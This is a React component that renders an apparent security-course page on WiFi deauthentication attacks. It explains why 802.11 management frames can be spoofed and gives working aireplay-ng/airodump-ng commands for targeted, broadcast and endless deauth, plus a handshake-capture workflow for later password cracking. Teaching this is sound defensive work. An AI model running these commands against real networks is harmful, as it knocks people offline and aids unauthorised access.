import React from 'react';
import Terminal from '../../components/Terminal';
import InfoBox from '../../components/InfoBox';
import Diagram from '../../components/Diagram';

const DeauthAttack = () => {
  return (
    <div className="page-content">
      <h1>Deauthentication Attack — Disconnecting Devices at Will</h1>

      <p>
        The <strong>deauthentication (deauth) attack</strong> is one of the most powerful and widely-used 
        WiFi attacks. It allows you to forcefully disconnect any device from any WiFi network — without 
        needing the network password. It exploits a fundamental design flaw in the WiFi protocol that 
        has existed since 802.11's inception and still affects WPA2 networks today.
      </p>

      <img 
        src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/ae/Wi-Fi_deauthentication_attack_sequence_diagram.svg/800px-Wi-Fi_deauthentication_attack_sequence_diagram.svg.png" 
        alt="WiFi deauthentication attack sequence diagram"
        style={{ maxWidth: '100%', borderRadius: 8, margin: '16px 0', background: '#fff', padding: 8 }}
      />
      <p style={{ fontSize: 13, color: 'var(--text-secondary)' }}>
        Sequence diagram showing how a deauthentication attack works — the attacker forges disconnect frames.
      </p>

      {/* ============================================================ */}
      {/* SECTION: How It Works                                        */}
      {/* ============================================================ */}
      <h2>🧠 How Does a Deauth Attack Work?</h2>

      <p>
        Here's the story: In WiFi, when a device wants to disconnect from a network, the access point 
        sends a special frame called a <strong>deauthentication frame</strong>. This is a management 
        frame — and here's the critical vulnerability: <strong>management frames in 802.11 are not 
        encrypted or authenticated</strong>. Anyone can forge them.
      </p>

      <p>
        It's like a school intercom system where anyone can pick up the microphone and announce: 
        <em>"John, please leave the classroom."</em> John doesn't verify who made the announcement — 
        he just leaves. In WiFi, the device (John) receives a deauth frame that appears to come from 
        the router and immediately disconnects, no questions asked.
      </p>

      <Diagram title="Deauthentication Attack — Step by Step">
{`
  Normal Connection:
  ┌──────────┐  ◄═══ encrypted data ═══►  ┌──────────┐
  │  Client  │         (happy)             │  Router  │
  │  (Phone) │                             │  (AP)    │
  └──────────┘                             └──────────┘
  
  
  Attack Step 1: Attacker forges deauth frame
  ┌──────────┐                             ┌──────────┐
  │  Client  │                             │  Router  │
  │  (Phone) │                             │  (AP)    │
  └──────────┘                             └──────────┘
       ▲                                        
       │   Forged deauth frame                  
       │   Source: Router's MAC                 
       │   Dest: Client's MAC                  
       │   Reason: "Unspecified"               
  ┌────┴─────┐                                 
  │ ATTACKER │  "Hey phone, the router says    
  │ (Kali)   │   you're disconnected!"         
  └──────────┘                                 
  
  
  Attack Step 2: Client disconnects immediately!
  ┌──────────┐         ✘ DISCONNECTED ✘    ┌──────────┐
  │  Client  │                             │  Router  │
  │  (Phone) │  "The router kicked me      │  (AP)    │
  │          │   out... let me reconnect"  │          │
  └──────────┘                             └──────────┘
  
  
  Attack Step 3: Client reconnects (4-way handshake!)
  ┌──────────┐  ═══ 4-Way Handshake ═══►   ┌──────────┐
  │  Client  │  ◄═══ (EAPOL frames) ═══   │  Router  │
  │  (Phone) │                             │  (AP)    │
  └──────────┘                             └──────────┘
       │                                        
       │   Attacker captures handshake!         
  ┌────▼─────┐                                 
  │ ATTACKER │  "Got the handshake!            
  │ (Kali)   │   Now I can crack it offline."  
  └──────────┘                                 
`}
      </Diagram>

      {/* ============================================================ */}
      {/* SECTION: Why It Works                                        */}
      {/* ============================================================ */}
      <h2>🔓 Why This Vulnerability Exists</h2>

      <p>
        This isn't a bug — it's a <strong>design flaw</strong> in the original 802.11 specification. 
        Management frames (including deauth, disassociation, and beacon frames) were designed to be 
        sent <em>before</em> encryption is established. Since encryption only protects data frames 
        after the 4-way handshake completes, management frames are always in the clear.
      </p>

      <table style={{ width: '100%', borderCollapse: 'collapse', margin: '16px 0' }}>
        <thead>
          <tr style={{ borderBottom: '2px solid var(--border-color)' }}>
            <th style={{ padding: '8px', textAlign: 'left' }}>Frame Type</th>
            <th style={{ padding: '8px', textAlign: 'left' }}>Protected?</th>
            <th style={{ padding: '8px', textAlign: 'left' }}>Examples</th>
            <th style={{ padding: '8px', textAlign: 'left' }}>Spoofable?</th>
          </tr>
        </thead>
        <tbody>
          {[
            ['Data Frames', '✅ Encrypted (WPA2)', 'HTTP, emails, video', '❌ No (encrypted)'],
            ['Management Frames', '❌ NOT encrypted', 'Deauth, Beacon, Probe', '✅ YES (attackable!)'],
            ['Control Frames', '❌ NOT encrypted', 'ACK, RTS/CTS', '✅ YES'],
          ].map(([type, prot, examples, spoof], i) => (
            <tr key={i} style={{ borderBottom: '1px solid var(--border-color)' }}>
              <td style={{ padding: '8px' }}><strong>{type}</strong></td>
              <td style={{ padding: '8px' }}>{prot}</td>
              <td style={{ padding: '8px' }}>{examples}</td>
              <td style={{ padding: '8px' }}>{spoof}</td>
            </tr>
          ))}
        </tbody>
      </table>

      <InfoBox type="note">
        <strong>802.11w (Protected Management Frames / PMF):</strong> The IEEE eventually created 
        802.11w to protect management frames with encryption. WPA3 <em>requires</em> PMF, and WPA2 
        can optionally enable it. When PMF is active, deauth attacks <strong>no longer work</strong> 
        because the client can verify that the deauth frame is authentic. However, as of 2024, most 
        home networks still use WPA2 without PMF, so deauth attacks remain widely effective.
      </InfoBox>

      {/* ============================================================ */}
      {/* SECTION: Use Cases                                           */}
      {/* ============================================================ */}
      <h2>🎯 Why We Use Deauth Attacks</h2>

      <h3>1. Capture WPA/WPA2 Handshakes</h3>
      <p>
        This is the #1 reason. To crack a WPA password, you need to capture the 4-way handshake. 
        You could wait for a device to naturally connect (could take hours), or you can deauth a 
        client and capture the handshake when it automatically reconnects (takes seconds).
      </p>

      <h3>2. Denial of Service (DoS)</h3>
      <p>
        Continuously sending deauth frames keeps all clients permanently disconnected from the network. 
        The network becomes unusable. This can be used to force users onto your rogue access point.
      </p>

      <h3>3. Discover Hidden SSIDs</h3>
      <p>
        When a client reconnects after being deauthed, it sends the hidden network's SSID in its 
        probe request and association frames. This reveals the hidden network name.
      </p>

      <h3>4. Force Network Migration</h3>
      <p>
        In combination with an Evil Twin attack: deauth users from the real AP, set up a fake AP 
        with the same name, and users automatically connect to yours instead.
      </p>

      {/* ============================================================ */}
      {/* SECTION: Performing the Attack                                */}
      {/* ============================================================ */}
      <h2>💀 Performing a Deauthentication Attack</h2>

      <p>
        The tool we use is <code>aireplay-ng</code>, part of the aircrack-ng suite. You must be in 
        monitor mode and locked to the target's channel.
      </p>

      <h3>Prerequisites</h3>
      <Terminal lines={[
        { segments: [{ text: '# 1. Be in monitor mode', type: 'comment' }] },
        { segments: [{ text: '└─$ ', type: 'prompt' }, { text: 'sudo airmon-ng start wlan0', type: 'command' }] },
        { segments: [{ text: '', type: 'output' }] },
        { segments: [{ text: '# 2. Have airodump-ng running (to capture the handshake)', type: 'comment' }] },
        { segments: [{ text: '# In terminal 1:', type: 'comment' }] },
        { segments: [{ text: '└─$ ', type: 'prompt' }, { text: 'sudo airodump-ng --bssid AA:BB:CC:11:22:33 --channel 6 --write handshake wlan0mon', type: 'command' }] },
      ]} />

      <h3>Attack Commands</h3>
      <Terminal lines={[
        { segments: [{ text: '# ═══════════════════════════════════════════', type: 'comment' }] },
        { segments: [{ text: '# DEAUTH A SPECIFIC CLIENT (targeted)', type: 'comment' }] },
        { segments: [{ text: '# ═══════════════════════════════════════════', type: 'comment' }] },
        { segments: [{ text: '# In terminal 2 (keep airodump-ng running!):', type: 'comment' }] },
        { segments: [{ text: '┌──(kali㉿kali)-[~]', type: 'prompt' }] },
        { segments: [{ text: '└─$ ', type: 'prompt' }, { text: 'sudo aireplay-ng --deauth 10 -a AA:BB:CC:11:22:33 -c A1:B2:C3:D4:E5:F6 wlan0mon', type: 'command' }] },
        { segments: [{ text: '', type: 'output' }] },
        { segments: [{ text: '14:30:15  Waiting for beacon frame (BSSID: AA:BB:CC:11:22:33) on channel 6', type: 'output' }] },
        { segments: [{ text: '14:30:15  Sending 64 directed DeAuth (code 7). STMAC: [A1:B2:C3:D4:E5:F6]', type: 'output' }] },
        { segments: [{ text: '14:30:16  Sending 64 directed DeAuth (code 7). STMAC: [A1:B2:C3:D4:E5:F6]', type: 'output' }] },
        { segments: [{ text: '14:30:16  Sending 64 directed DeAuth (code 7). STMAC: [A1:B2:C3:D4:E5:F6]', type: 'output' }] },
        { segments: [{ text: '...', type: 'output' }] },
        { segments: [{ text: '', type: 'output' }] },
        { segments: [{ text: '# ═══════════════════════════════════════════', type: 'comment' }] },
        { segments: [{ text: '# DEAUTH ALL CLIENTS (broadcast)', type: 'comment' }] },
        { segments: [{ text: '# ═══════════════════════════════════════════', type: 'comment' }] },
        { segments: [{ text: '┌──(kali㉿kali)-[~]', type: 'prompt' }] },
        { segments: [{ text: '└─$ ', type: 'prompt' }, { text: 'sudo aireplay-ng --deauth 10 -a AA:BB:CC:11:22:33 wlan0mon', type: 'command' }] },
        { segments: [{ text: '# Without -c flag → sends broadcast deauth to ALL clients', type: 'comment' }] },
        { segments: [{ text: '', type: 'output' }] },
        { segments: [{ text: '# ═══════════════════════════════════════════', type: 'comment' }] },
        { segments: [{ text: '# CONTINUOUS DEAUTH (DoS - use carefully!)', type: 'comment' }] },
        { segments: [{ text: '# ═══════════════════════════════════════════', type: 'comment' }] },
        { segments: [{ text: '┌──(kali㉿kali)-[~]', type: 'prompt' }] },
        { segments: [{ text: '└─$ ', type: 'prompt' }, { text: 'sudo aireplay-ng --deauth 0 -a AA:BB:CC:11:22:33 wlan0mon', type: 'command' }] },
        { segments: [{ text: '# --deauth 0 = INFINITE deauth (never stops!)', type: 'comment' }] },
        { segments: [{ text: '# Press Ctrl+C to stop', type: 'comment' }] },
      ]} />

      <h3>Breaking Down the Command</h3>
      <Diagram title="aireplay-ng Deauth Command Explained">
{`
  sudo aireplay-ng --deauth 10 -a AA:BB:CC:11:22:33 -c A1:B2:C3:D4:E5:F6 wlan0mon
  │                │         │  │                    │                     │
  │                │         │  │                    │                     └─ Interface
  │                │         │  │                    │                        (monitor mode)
  │                │         │  │                    │
  │                │         │  │                    └─ Target CLIENT MAC
  │                │         │  │                       (the device to kick)
  │                │         │  │                       Omit for broadcast
  │                │         │  │
  │                │         │  └─ Target AP BSSID
  │                │         │     (the router's MAC)
  │                │         │
  │                │         └─ Number of deauth packets
  │                │            10 = send 10 bursts
  │                │            0  = infinite (never stop)
  │                │
  │                └─ Attack type: deauthentication
  │
  └─ Run as root
`}
      </Diagram>

      <InfoBox type="tip">
        <strong>How many deauth packets to send?</strong>
        <ul>
          <li><code>--deauth 5</code> — Quick burst. Usually enough to capture a handshake.</li>
          <li><code>--deauth 10</code> — Moderate. Good default for handshake capture.</li>
          <li><code>--deauth 50</code> — Aggressive. For stubborn clients at weak signal.</li>
          <li><code>--deauth 0</code> — Infinite. For DoS attacks. Client can NEVER reconnect.</li>
        </ul>
        For handshake capture, you <em>want</em> the client to reconnect, so don't use 0! Use 5-10 bursts, 
        then check airodump-ng for the handshake.
      </InfoBox>

      {/* ============================================================ */}
      {/* SECTION: Workflow                                            */}
      {/* ============================================================ */}
      <h2>📋 Complete Handshake Capture Workflow</h2>

      <Diagram title="Deauth + Handshake Capture Workflow">
{`
  ┌─────────────────────────────────────────────────────────┐
  │  Terminal 1: Targeted airodump-ng (always running)      │
  │  $ airodump-ng --bssid [AP] --channel [CH]              │
  │    --write handshake wlan0mon                           │
  │                                                         │
  │  Watch the top-right corner for:                        │
  │  "WPA handshake: AA:BB:CC:11:22:33"                    │
  └─────────────────────────────────────────────────────────┘
  
  ┌─────────────────────────────────────────────────────────┐
  │  Terminal 2: Deauth attack                              │
  │  $ aireplay-ng --deauth 10 -a [AP] -c [CLIENT]         │
  │    wlan0mon                                             │
  │                                                         │
  │  Wait a few seconds, then check Terminal 1              │
  └─────────────────────────────────────────────────────────┘
  
  Success check:
  ┌─────────────────────────────────────────────────────────┐
  │  Did "WPA handshake" appear in Terminal 1?              │
  │                                                         │
  │  ✅ YES → Stop both. Run aircrack-ng on the .cap file   │
  │  ❌ NO  → Try again:                                    │
  │     ├─ Deauth a different client                        │
  │     ├─ Use more deauth packets (--deauth 50)            │
  │     ├─ Move closer to the AP/client                     │
  │     └─ Try broadcast deauth (no -c flag)                │
  └─────────────────────────────────────────────────────────┘
`}
      </Diagram>

      {/* ============================================================ */}
      {/* SECTION: Edge Cases                                          */}
      {/* ============================================================ */}
      <h2>⚠️ Edge Cases & Troubleshooting</h2>

      <h3>Edge Case: Deauth not working (client stays connected)</h3>
      <ul>
        <li><strong>802.11w / PMF enabled:</strong> If the network uses Protected Management Frames, deauth frames are rejected. Check the ENC column — if it shows "WPA3" or the AP supports PMF, deauth won't work.</li>
        <li><strong>Wrong channel:</strong> Your adapter must be on the same channel as the AP. Verify with <code>iwconfig</code>.</li>
        <li><strong>Signal too weak:</strong> Deauth frames must reach both the AP and the client. Move closer.</li>
        <li><strong>Some devices are resilient:</strong> Newer iOS devices may delay reconnection or switch to a different BSSID. Try multiple times.</li>
      </ul>

      <h3>Edge Case: "Waiting for beacon frame" forever</h3>
      <Terminal lines={[
        { segments: [{ text: '# This means the adapter can\'t see the AP\'s beacons', type: 'comment' }] },
        { segments: [{ text: '# Possible causes:', type: 'comment' }] },
        { segments: [{ text: '# 1. Wrong channel (set it manually):', type: 'comment' }] },
        { segments: [{ text: '└─$ ', type: 'prompt' }, { text: 'iwconfig wlan0mon channel 6', type: 'command' }] },
        { segments: [{ text: '', type: 'output' }] },
        { segments: [{ text: '# 2. AP is on 5 GHz but your adapter only supports 2.4 GHz', type: 'comment' }] },
        { segments: [{ text: '# 3. AP is too far away', type: 'comment' }] },
        { segments: [{ text: '# 4. BSSID is wrong — double-check it', type: 'comment' }] },
      ]} />

      <h3>Edge Case: Handshake not captured despite successful deauth</h3>
      <p>
        The client disconnected (you can see it briefly disappear from airodump-ng) but no handshake 
        was captured. This can happen when:
      </p>
      <ul>
        <li>The client reconnects too fast (before your adapter switched back from sending deauth to listening)</li>
        <li>The client doesn't auto-reconnect (some devices require manual reconnection)</li>
        <li>The client switches to a different band (e.g., 5 GHz) when reconnecting</li>
        <li>Packet loss — your adapter missed some EAPOL frames</li>
      </ul>
      <p><strong>Solution:</strong> Try targeting a different client, or use a shorter deauth burst (<code>--deauth 3</code>).</p>

      <h3>Edge Case: Using deauth with no connected clients</h3>
      <p>
        If no clients are connected to the target network, deauth attacks are useless — there's nothing 
        to deauth. You'll need to wait for someone to connect naturally and capture the handshake then. 
        This is why targeting networks with multiple active clients is preferable.
      </p>

      <InfoBox type="danger">
        <strong>⚖️ Legal Warning:</strong> Deauthentication attacks are <strong>illegal</strong> when 
        performed against networks you don't own or don't have explicit authorization to test. Even 
        "harmless" deauth attacks constitute unauthorized interference with a communications system 
        and can violate the Computer Fraud and Abuse Act (US), Computer Misuse Act (UK), and similar 
        laws worldwide. Always practice on your own network in a controlled lab environment!
      </InfoBox>

      <InfoBox type="success">
        <strong>Key Takeaways:</strong>
        <ul>
          <li>Deauth attacks exploit unprotected WiFi management frames</li>
          <li>Primary use: force reconnection to capture WPA handshakes</li>
          <li>Use <code>aireplay-ng --deauth</code> with airodump-ng running simultaneously</li>
          <li>Target specific clients with <code>-c</code> for best results</li>
          <li>Don't use <code>--deauth 0</code> if you need the handshake — the client must reconnect!</li>
          <li>WPA3 and 802.11w/PMF make deauth attacks ineffective</li>
          <li>Always have proper authorization before performing these attacks</li>
        </ul>
      </InfoBox>

      <h2>📚 What's Next?</h2>
      <p>
        Now we move to the <strong>Gaining Access</strong> section, where we'll learn about WiFi 
        encryption types (WEP, WPA, WPA2, WPA3) and how to crack them. The handshakes we captured 
        here will be essential for WPA password cracking!
      </p>
    </div>
  );
};

export default DeauthAttack;
